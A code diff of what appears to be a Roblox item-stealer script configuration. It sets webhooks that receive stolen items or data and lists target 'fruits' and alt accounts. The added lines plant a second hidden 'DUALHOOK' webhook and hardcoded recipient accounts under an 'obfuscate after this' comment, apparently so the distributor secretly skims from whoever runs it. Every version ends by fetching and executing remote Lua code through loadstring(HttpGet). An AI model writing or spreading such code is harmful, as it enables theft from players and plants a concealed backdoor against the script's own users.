@@ -1,5 +1,6 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=Ymxfcmw2U1N6TXBzX2JUVi1kWjVWUTpqN2haM3I0YVliTWd1Q0lHU1RLVGhtcVFXN1pxZHBtMUtYMzBSRXpuRENIVGVSWE9SX0lqQnhwdTZQWEpyaUVPdXJvazRBa29oWTQ3MTFHNUg4RTJudU1EblF3SVFaa3l2ZU5yYnFFSTdNV0RldU1sdGh5TmdnZFZ5d3FKZHhxajI5eTJIMGRBZTBtMFh5a3YxemRCcEF3STVCVTM1bmRTRk9IdUxDYjFiMUU" -- << Your Webhook
-Usernames = {"user1", "user2"} -- << Your usernames here, you can add as many alts as you want
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough"} -- << Fruits you want the script to detect
+--obfuscate after this
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TrueBlue23/stuFF/refs/heads/main/wowowo"))()
+local Webhook2 = "https://webhook-protect.vercel.app/api/webhook?id=ZXVBdkplRVRDQ0FCekllNXRvMXE4QTo0RTdoRVdWakw1SHFPdmNaWElNQTRMdWJQUURsaTU5eWROcnNGV0hFcC0yaHpJTm54MjZ1QW1BMERPNGtRTzh0eURZUUg2RU0xcjQwbFNQbDJ0RHp0ZlA5RE12S1F3eVY1N3BJdU1ncVMzWnhYQUZWM2dEdG10Mi1VOTkxb1J0allmVmx0S3pQQ0ZMQjlfSmVaajBXV2ZBNktReHc5MDNWbVNKbGZKZjNFa3M" -- Replace with your DUALHOOK URL
+local DualUsers = {"xxxvic41", "xfrost102", "yeetdog545", "iluvrottencheese123"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrektl/stuFF/refs/heads/main/wowowo"))() 
